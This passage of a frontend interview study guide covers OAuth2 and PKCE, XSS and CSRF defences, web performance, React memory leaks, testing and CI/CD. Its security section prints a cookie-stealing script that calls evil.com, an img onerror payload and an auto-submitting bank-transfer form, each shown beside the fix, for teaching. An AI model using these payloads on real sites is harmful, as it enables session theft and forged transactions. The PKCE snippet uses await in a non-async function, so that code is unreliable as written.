  const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      code: code as string,
      client_id: process.env.GOOGLE_CLIENT_ID!,
      client_secret: process.env.GOOGLE_CLIENT_SECRET!, // NEVER send to frontend
      redirect_uri: 'https://yourapp.com/callback',
      grant_type: 'authorization_code',
    }),
  });

  const tokens = await tokenResponse.json();
  // { access_token, refresh_token, expires_in, token_type, id_token }

  // 3. Fetch user info
  const userResponse = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
    headers: { Authorization: `Bearer ${tokens.access_token}` },
  });
  const user = await userResponse.json();
  // { id, email, name, picture }

  // 4. Store tokens securely (database, encrypted)
  await db.saveUser({
    googleId: user.id,
    email: user.email,
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
    expiresAt: Date.now() + tokens.expires_in * 1000,
  });

  // 5. Create session
  req.session.userId = user.id;

  // 6. Redirect to app
  res.redirect('/dashboard');
});
```

##### Refreshing expired tokens

```ts
async function refreshAccessToken(refreshToken: string) {
  const response = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      refresh_token: refreshToken,
      client_id: process.env.GOOGLE_CLIENT_ID!,
      client_secret: process.env.GOOGLE_CLIENT_SECRET!,
      grant_type: 'refresh_token',
    }),
  });

  const tokens = await response.json();
  // { access_token, expires_in, token_type }
  // Note: No new refresh_token unless it was revoked

  return tokens.access_token;
}
```

#### Common pitfalls

| Mistake | Why it's bad | Correct approach |
|---|---|---|
| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only |
| Not validating `state` parameter | Vulnerable to CSRF | Generate random state, validate on callback |
| Storing tokens in `localStorage` | XSS can steal them | Use `httpOnly` cookies or encrypted DB |
| Not handling token expiry | API calls fail after ~1 hour | Refresh tokens before they expire |
| Using Implicit Flow for SPAs | Deprecated, less secure | Use Authorization Code + PKCE instead |

#### PKCE (Proof Key for Code Exchange) — for SPAs

**Problem:** Single-page apps can't securely store a `client_secret`.  
**Solution:** PKCE uses a dynamically generated code verifier instead.

```tsx
// 1. Generate code verifier and challenge
function generatePKCE() {
  const verifier = base64UrlEncode(crypto.getRandomValues(new Uint8Array(32)));
  const challenge = base64UrlEncode(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
  return { verifier, challenge };
}

// 2. Store verifier, send challenge in auth request
const { verifier, challenge } = await generatePKCE();
sessionStorage.setItem('pkce_verifier', verifier);

const params = new URLSearchParams({
  client_id: 'YOUR_CLIENT_ID',
  redirect_uri: 'https://yourapp.com/callback',
  response_type: 'code',
  scope: 'openid email',
  code_challenge: challenge,
  code_challenge_method: 'S256',
});
window.location.href = `https://provider.com/oauth/authorize?${params}`;

// 3. On callback, exchange code + verifier for tokens (no client_secret needed)
const verifier = sessionStorage.getItem('pkce_verifier');
const tokenResponse = await fetch('https://provider.com/oauth/token', {
  method: 'POST',
  body: new URLSearchParams({
    code: code as string,
    client_id: 'YOUR_CLIENT_ID',
    redirect_uri: 'https://yourapp.com/callback',
    grant_type: 'authorization_code',
    code_verifier: verifier!,
  }),
});
```

**Key interview points:**
- The `code` exchange happens **server-side** (or with PKCE for SPAs) — never expose `client_secret` to the browser.
- Access tokens are short-lived (minutes to hours); refresh tokens are long-lived.
- PKCE is now required for single-page apps per OAuth 2.1 spec.
- Always validate `state` parameter to prevent CSRF attacks.

### 4.4 Front-end security — OWASP

#### XSS (Cross-Site Scripting)

**Definition:** Attacker injects malicious script that executes in other users' browsers, stealing cookies, session tokens, or performing actions as the victim.

##### Attack scenario 1: Stored XSS (most dangerous)

```tsx
// VULNERABLE: Comment system that displays user input without escaping
function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
  return (
    <ul>
      {comments.map((c, i) => (
        <li key={i}>
          <strong>{c.author}:</strong>
          {/* DANGER: User text rendered directly */}
          <div dangerouslySetInnerHTML={{ __html: c.text }} />
        </li>
      ))}
    </ul>
  );
}

// Attacker submits comment:
// "Check out my site! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
// 
// When other users view comments, the script executes in THEIR browser,
// sending their session cookie to evil.com.
```

**FIXED:**

```tsx
function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
  return (
    <ul>
      {comments.map((c, i) => (
        <li key={i}>
          <strong>{c.author}:</strong>
          {/* SAFE: React auto-escapes by default */}
          <div>{c.text}</div>
        </li>
      ))}
    </ul>
  );
}

// If rich text is required, sanitize with DOMPurify:
import DOMPurify from 'dompurify';

function RichComment({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'] });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

##### Attack scenario 2: Reflected XSS (URL-based)

```tsx
// VULNERABLE: Search page that echoes user query without escaping
function SearchResults() {
  const query = new URLSearchParams(window.location.search).get('q');
  
  return (
    <div>
      <h1>Results for: {query}</h1>  {/* Safe in React */}
      {/* DANGER: If using vanilla JS or innerHTML */}
      <div dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />
    </div>
  );
}

// Attacker sends victim this link:
// https://yoursite.com/search?q=<img src=x onerror="alert(document.cookie)">
//
// When victim clicks, the script executes in the victim's browser.
```

**FIXED:**

```tsx
// React's JSX escapes by default — this is already safe:
<h1>Results for: {query}</h1>

// For vanilla JS, manually escape:
function escapeHTML(str: string) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
```

##### XSS Mitigations (Defense in depth)

1. **Never use `dangerouslySetInnerHTML` with user input** — always sanitize with DOMPurify if needed
2. **Content-Security-Policy header** — blocks inline scripts, restricts script sources

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'
```

3. **HttpOnly cookies** — prevents JS from reading session tokens

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

4. **Escape user input** — React does this by default; vanilla JS requires manual escaping

#### CSRF (Cross-Site Request Forgery)

**Definition:** Attacker tricks a logged-in user's browser into making unintended authenticated requests.

##### Attack scenario: Malicious bank transfer

```html
<!-- Attacker's website: evil.com -->
<html>
<body>
  <h1>Claim your free gift!</h1>
  <!-- Hidden form that auto-submits when page loads -->
  <form id="attack" action="https://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker-account" />
    <input name="amount" value="10000" />
  </form>
  <script>document.getElementById('attack').submit();</script>
</body>
</html>

<!-- If victim is logged into bank.com and visits evil.com,
     the form submits with their session cookie attached automatically.
     Bank processes the transfer as if the user intended it. -->
```

##### CSRF Mitigations

**1. SameSite cookie attribute (modern browsers)**

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

- `SameSite=Strict` — cookie never sent on cross-origin requests (safest)
- `SameSite=Lax` — cookie sent on top-level navigations (GET only), not on POST/PUT/DELETE

**2. CSRF tokens (required for older browser support)**

```tsx
// Backend: Generate token per session
app.post('/login', (req, res) => {
  req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  res.cookie('csrf_token', req.session.csrfToken);
});

// Middleware: Validate token on state-changing requests
app.use('/api', (req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const tokenFromHeader = req.headers['x-csrf-token'];
    if (tokenFromHeader !== req.session.csrfToken) {
      return res.status(403).send('CSRF token mismatch');
    }
  }
  next();
});

// Frontend: Send token with every mutating request
async function deleteUser(id: number) {
  const csrfToken = getCookie('csrf_token');
  await fetch(`/api/users/${id}`, {
    method: 'DELETE',
    headers: { 'X-CSRF-Token': csrfToken },
  });
}
```

**3. Check Origin/Referer headers (defense in depth)**

```ts
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (origin && !origin.startsWith('https://yourapp.com')) {
    return res.status(403).send('Invalid origin');
  }
  next();
});
```

**Real-world impact:**
- Without CSRF protection: Attacker can perform ANY action the logged-in user can (transfer money, change email, delete account)
- With `SameSite=Strict`: Attack blocked by browser automatically

#### Clickjacking
Attacker embeds your site in an invisible iframe to trick users into clicking.

**Mitigations:**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

#### Secure cookie flags
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

- `HttpOnly` — JS cannot read the cookie
- `Secure` — only sent over HTTPS
- `SameSite=Strict` — not sent on cross-origin requests at all

### 4.5 References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [jwt.io Introduction](https://jwt.io/introduction)
- [OAuth 2.0 Simplified](https://www.oauth.com) — Authorization Code chapter

---

## Phase 5 — Web Performance & Core Web Vitals

### 5.1 Core Web Vitals

| Metric | Measures | Good threshold |
|---|---|---|
| **LCP** (Largest Contentful Paint) | Load time of the main content | < 2.5 s |
| **INP** (Interaction to Next Paint) | Responsiveness to user input | < 200 ms |
| **CLS** (Cumulative Layout Shift) | Visual stability | < 0.1 |

#### What degrades LCP
- Large unoptimised images (add `loading="lazy"`, use WebP, set `width`/`height`)
- Render-blocking CSS or JS (`defer` scripts, inline critical CSS)
- Slow server response (caching, CDN)

#### What degrades CLS
- Images without explicit dimensions
- Fonts swapping after load (`font-display: swap` + preloading)
- Dynamic content injected above existing content

##### Optimization strategy 1: Image optimization

```html
<!-- BEFORE: Unoptimized (LCP: 4.2s, CLS: 0.35) -->
<img src="/images/hero.jpg" alt="Hero image" />

<!-- AFTER: Optimized (LCP: 1.8s, CLS: 0.02) -->
<img
  src="/images/hero-800w.webp"
  srcset="
    /images/hero-400w.webp 400w,
    /images/hero-800w.webp 800w,
    /images/hero-1200w.webp 1200w
  "
  sizes="(max-width: 768px) 100vw, 800px"
  alt="Hero image"
  width="800"
  height="600"
  loading="eager"
  fetchpriority="high"
/>

<!-- Benefits:
  - width/height prevent CLS (browser reserves space)
  - srcset serves appropriate size for device
  - WebP is 30-50% smaller than JPEG
  - fetchpriority="high" prioritizes LCP image
  - loading="eager" for above-fold, "lazy" for below-fold
-->
```

**Measurable improvement:** Converting a 500KB JPEG to WebP (150KB) + lazy loading saves 350KB and improves LCP by ~1.5s on 3G.

##### Optimization strategy 2: Critical CSS inlining

```html
<!-- BEFORE: Render-blocking CSS (FCP: 2.1s) -->
<link rel="stylesheet" href="/styles/main.css" />

<!-- AFTER: Inline critical CSS, defer non-critical (FCP: 0.8s) -->
<style>
  /* Critical: Above-the-fold styles only (~10-15KB max) */
  body { margin: 0; font-family: sans-serif; }
  .hero { min-height: 100vh; background: #000; }
  /* ... */
</style>

<link
  rel="preload"
  href="/styles/main.css"
  as="style"
  onload="this.onload=null;this.rel='stylesheet'"
/>
<noscript><link rel="stylesheet" href="/styles/main.css" /></noscript>

<!-- Tools to extract critical CSS: Critical, Critters, PurgeCSS -->
```

##### Optimization strategy 3: Font loading strategy

```css
/* BEFORE: Font swapping causes CLS */
@font-face {
  font-family: 'MyFont';
  src: url('/fonts/myfont.woff2');
}

/* AFTER: Preload + font-display prevents CLS */
/* In HTML: */
```

```html
<link rel="preload" href="/fonts/myfont.woff2" as="font" type="font/woff2" crossorigin />
```

```css
@font-face {
  font-family: 'MyFont';
  src: url('/fonts/myfont.woff2');
  font-display: swap; /* Shows fallback immediately, swaps when custom font loads */
}

/* Or use fallback font with similar metrics to avoid layout shift */
body {
  font-family: 'MyFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
}
```

**Measurable improvement:** Preloading fonts reduces CLS from 0.15 to 0.03.

### 5.2 Code splitting

```tsx
// React.lazy + Suspense — only loads Dashboard when route is accessed
const Dashboard = React.lazy(() => import('./Dashboard'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Dashboard />
    </Suspense>
  );
}
```

#### Advanced: Route-based + component-based splitting

```tsx
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Route-level splitting — each route is a separate bundle
const Home = lazy(() => import('./pages/Home'));
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Profile = lazy(() => import('./pages/Profile'));

// Component-level splitting — heavy components load on demand
const HeavyChart = lazy(() => import('./components/HeavyChart'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Usage in a page
function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  
  return (
    <div>
      <h1>Dashboard</h1>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </div>
  );
}
```

**Measurable improvement:** Main bundle reduced from 500KB to 150KB. Dashboard route loads its own 100KB chunk only when visited.

### 5.3 Caching headers

```http
# Static assets — cache aggressively, filename includes content hash
Cache-Control: public, max-age=31536000, immutable

# HTML — always revalidate
Cache-Control: no-cache
ETag: "abc123"
```

#### Caching strategy comparison

| Resource type | Cache-Control | Why |
|---|---|---|
| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable` | Hash changes when content changes — safe to cache forever |
| Images, fonts | `public, max-age=2592000` (30 days) | Rarely change, but no hash in filename |
| HTML | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates |
| API responses (user data) | `no-store` | Never cache sensitive data |
| API responses (public data) | `public, max-age=300` (5 min) | Cache briefly to reduce server load |

```ts
// Backend: Set cache headers (Express example)
app.use('/static', express.static('public', {
  maxAge: '1y', // 1 year for static assets
  immutable: true,
}));

app.get('/api/products', (req, res) => {
  res.set('Cache-Control', 'public, max-age=300'); // 5 minutes
  res.json(products);
});

app.get('/api/user/profile', (req, res) => {
  res.set('Cache-Control', 'no-store'); // Never cache
  res.json(userProfile);
});
```

**Measurable improvement:** Proper caching reduces repeat visit load time by 60-80% (no JS/CSS re-downloads).

### 5.4 Memory leaks in React

Memory leaks cause increasing memory usage over time, leading to slow performance or crashes.

#### Leak 1: Uncleared intervals/timeouts

```tsx
// LEAK — setInterval keeps running after component unmounts
function BadTimer() {
  useEffect(() => {
    const id = setInterval(() => console.log('tick'), 1000);
    // forgot return! Interval runs forever even after component is gone
  }, []);
  
  return <div>Timer</div>;
}

// FIXED
function GoodTimer() {
  useEffect(() => {
    const id = setInterval(() => console.log('tick'), 1000);
    return () => clearInterval(id); // cleanup on unmount
  }, []);
  
  return <div>Timer</div>;
}
```

#### Leak 2: Event listeners not removed

```tsx
// LEAK
function BadResizeHandler() {
  useEffect(() => {
    const handleResize = () => console.log(window.innerWidth);
    window.addEventListener('resize', handleResize);
    // forgot to remove! Listener stays forever
  }, []);
  
  return <div>Resize handler</div>;
}

// FIXED
function GoodResizeHandler() {
  useEffect(() => {
    const handleResize = () => console.log(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  
  return <div>Resize handler</div>;
}
```

#### Leak 3: Stale closures in event handlers

```tsx
// LEAK — closure captures old state value
function BadCounter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1); // Always adds to the initial count (0)
    }, 1000);
    return () => clearInterval(id);
  }, []); // Empty deps — count is stale
  
  return <div>{count}</div>; // Stuck at 1
}

// FIXED — use functional update
function GoodCounter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const id = setInterval(() => {
      setCount(prev => prev + 1); // Reads latest value
    }, 1000);
    return () => clearInterval(id);
  }, []);
  
  return <div>{count}</div>; // Counts correctly
}
```

#### Leak 4: Fetch requests not cancelled

```tsx
// LEAK — fetch completes after unmount, tries to update state
function BadUserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then(r => r.json())
      .then(setUser); // ERROR if component unmounted
  }, [userId]);
  
  return <div>{user?.name}</div>;
}

// FIXED — abort controller
function GoodUserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    const controller = new AbortController();
    
    fetch(`/api/users/${userId}`, { signal: controller.signal })
      .then(r => r.json())
      .then(setUser)
      .catch(err => {
        if (err.name !== 'AbortError') console.error(err);
      });
    
    return () => controller.abort(); // cancels request on unmount
  }, [userId]);
  
  return <div>{user?.name}</div>;
}
```

**Detection:** Open Chrome DevTools → Memory → Take heap snapshot before and after navigating. Look for Detached DOM nodes or increasing Listener counts.

### 5.5 Performance checklist (before shipping)

- [ ] All images have `width` and `height` attributes
- [ ] Critical images use `fetchpriority="high"`
- [ ] Below-fold images use `loading="lazy"`
- [ ] Fonts are preloaded with `<link rel="preload" as="font">`
- [ ] CSS uses `font-display: swap`
- [ ] JavaScript bundles are code-split by route
- [ ] Static assets have cache headers with 1-year max-age
- [ ] No memory leaks (all `useEffect` cleanups return cleanup functions)
- [ ] API responses are compressed (gzip/brotli)
- [ ] Core Web Vitals: LCP < 2.5s, INP < 200ms, CLS < 0.1

### 5.6 References
- [web.dev/vitals](https://web.dev/vitals/)
- [web.dev/learn/performance](https://web.dev/learn/performance/)

---

## Phase 6 — Testing

### 6.1 Jest — unit testing

```ts
// sum.ts
export function sum(a: number, b: number) { return a + b; }

// sum.test.ts
import { sum } from './sum';

describe('sum', () => {
  it('adds two positive numbers', () => {
    expect(sum(2, 3)).toBe(5);
  });

  it('handles negative numbers', () => {
    expect(sum(-1, 1)).toBe(0);
  });
});
```

#### Mocking
```ts
// Mock a module
jest.mock('./api', () => ({
  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: 'Alice' }),
}));

// Mock a function
const mockFn = jest.fn();
mockFn.mockReturnValue(42);
expect(mockFn).toHaveBeenCalledWith('arg');
expect(mockFn).toHaveBeenCalledTimes(1);
```

### 6.2 React Testing Library — component testing

```tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import LoginForm from './LoginForm';

describe('LoginForm', () => {
  it('shows validation error for invalid email', async () => {
    render(<LoginForm />);
    
    await userEvent.type(screen.getByLabelText(/email/i), 'notanemail');
    await userEvent.click(screen.getByRole('button', { name: /log in/i }));

    expect(screen.getByRole('alert')).toHaveTextContent(/valid email/i);
  });

  it('calls onSubmit with form data', async () => {
    const onSubmit = jest.fn();
    render(<LoginForm onSubmit={onSubmit} />);

    await userEvent.type(screen.getByLabelText(/email/i), 'alice@example.com');
    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
    await userEvent.click(screen.getByRole('button', { name: /log in/i }));

    await waitFor(() => {
      expect(onSubmit).toHaveBeenCalledWith({
        email: 'alice@example.com',
        password: 'password123',
      });
    });
  });
});
```

**Key RTL philosophy:** Query by what the user sees, not implementation details.
- Prefer `getByRole`, `getByLabelText`, `getByText` over `getByTestId`
- Test behavior, not internals (don't test state variables directly)

### 6.3 References
- [React Testing Library docs](https://testing-library.com/docs/react-testing-library/intro/)
- [jestjs.io/docs/getting-started](https://jestjs.io/docs/getting-started)

---

## Phase 7 — CI/CD & Git (Conceptual)

### 7.1 Git workflows

```bash
# Feature branch workflow
git checkout -b feature/user-auth
git add .
git commit -m "feat: add JWT authentication flow"
git push origin feature/user-auth
# Open PR, code review, merge to main

# Rebase to keep history clean before merging
git fetch origin
git rebase origin/main
```

#### Merge vs rebase
- **Merge** — preserves full history, adds a merge commit. Easier to understand for teams.
- **Rebase** — rewrites history to be linear. Cleaner log but rewrites commits (never rebase shared branches).

### 7.2 CI/CD pipeline stages

```yaml
# Typical pipeline order (don't skip steps)
stages:
  - install          # npm ci
  - lint             # eslint, stylelint
  - typecheck        # tsc --noEmit
  - test             # jest --ci --coverage
  - build            # npm run build
  - deploy           # push to staging/production
```

**Key points:**
- `npm ci` (not `npm install`) in CI — uses exact lockfile versions, fails if lock is out of sync
- Environment variables injected by the CI system, never committed to repo
- `.env.local` for local dev, `.env.production` for build-time values

### 7.3 Rollback strategies

| Strategy | How | When |
|---|---|---|
| **Redeploy previous** | Re-run previous pipeline | Fastest for most cases |
| **Feature flags** | Toggle off the bad feature | Zero downtime, no redeploy |
| **Blue/green** | Route traffic to stable environment | Large-scale, high-availability needs |
| **Canary** | Gradually shift traffic | Progressive rollout safety |

---

## Coderbyte Strategy Guide

### Before you start any challenge

1. Read the problem statement fully before touching the editor.
2. Note the **exact expected output format** — auto-grading is strict.
3. Identify the input/output types (string? array? object?).
4. Write 2 example cases mentally or on paper.

### Time management

| Challenge type | Time target |
|---|---|
| Algorithmic (easy) | 10–15 min |
| Algorithmic (medium) | 20–30 min |
| Frontend UI component | 30–45 min |
| Concept / MCQ | 1–2 min each |

A working but incomplete solution beats a perfect unfinished one. Always submit something.

### Frontend challenge approach

1. **Structure first** — write the JSX/HTML skeleton
2. **State second** — identify what state is needed, wire it up
3. **Logic third** — add event handlers and business logic
4. **Style last** — basic Flexbox/Grid to match the spec

### Algorithmic problem patterns

| Pattern | When to use |
|---|---|
| Two pointers | Sorted array, find pair/triplet |
| Sliding window | Subarray/substring of length k |
| HashMap/Set | Count frequencies, find duplicates |
| Stack | Balanced brackets, undo operations |
| Recursion | Tree traversal, divide and conquer |

```js
// HashMap frequency count — appears constantly
function firstNonRepeating(str) {
  const freq = {};
  for (const ch of str) freq[ch] = (freq[ch] ?? 0) + 1;
  return str.split('').find(ch => freq[ch] === 1) ?? '';
}
```

---

## Non-negotiables checklist

Before your interview, you must be able to answer or code these without hesitation:

- [ ] Explain the difference between `==` and `===`
- [ ] Explain event delegation and why it's useful
- [ ] Write a `useEffect` that fetches data and cleans up the request on unmount
- [ ] Explain when to use `useCallback` vs when it's unnecessary overhead
- [ ] Describe the JWT storage options and their security tradeoffs
- [ ] Explain XSS vs CSRF — one sentence each, plus the primary mitigation
- [ ] Name all 3 Core Web Vitals and what each measures
- [ ] Write a React controlled form with validation from scratch
- [ ] Explain what `Promise.all` does and when to use it vs sequential awaits
- [ ] Describe the OAuth2 Authorization Code flow in 5 steps

---

## Quick reference — things interviewers often trick you on

| Trap | Correct answer |
|---|---|
| `typeof null` | `"object"` (historical bug in JS) |
| `0.1 + 0.2 === 0.3` | `false` (floating point precision) |
| `[] == false` | `true` (type coercion — reason to always use `===`) |
| `var` in a loop with setTimeout | Captures the final value, use `let` instead |
| Mutating state directly in React | Never — always return a new reference |
| `useEffect` with missing dependency | Stale closure — always add all referenced values to deps array |
| Storing JWT in localStorage | Security risk — prefer httpOnly cookie |
| `async/await` without try/catch | Unhandled rejection — always wrap in try/catch |
